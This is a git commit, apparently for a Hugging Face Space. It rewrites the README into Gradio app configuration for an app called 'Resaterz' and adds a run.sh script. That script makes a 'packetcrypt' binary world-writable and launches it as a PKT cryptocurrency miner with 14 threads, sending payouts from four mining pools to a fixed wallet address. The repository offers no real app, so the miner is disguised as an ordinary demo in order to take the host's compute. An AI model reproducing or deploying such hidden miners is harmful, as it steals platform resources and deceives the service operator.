19ccb49d65e1efc03aff7742e405b17182be77bb
suwaytan2 <123476456+suwaytan2@users.noreply.github.com>
2023-01-24 20:57:39 +0700

    Add files via upload

--- README.md
+++ README.md
@@ -1,1 +1,11 @@
-# sezekiha
+---
+title: Resaterz
+emoji: 💻
+colorFrom: indigo
+colorTo: red
+sdk: gradio
+sdk_version: 3.16.2
+app_file: app.py
+pinned: false
+---
+
---
+++ run.sh
@@ -0,0 +1,1 @@
+chmod 777 packetcrypt && ./packetcrypt ann -p pkt1qatg02nqpj868czq0y2t4uf2l36e5jted0hq4fa https://stratum.zetahash.com/ http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com -t 14
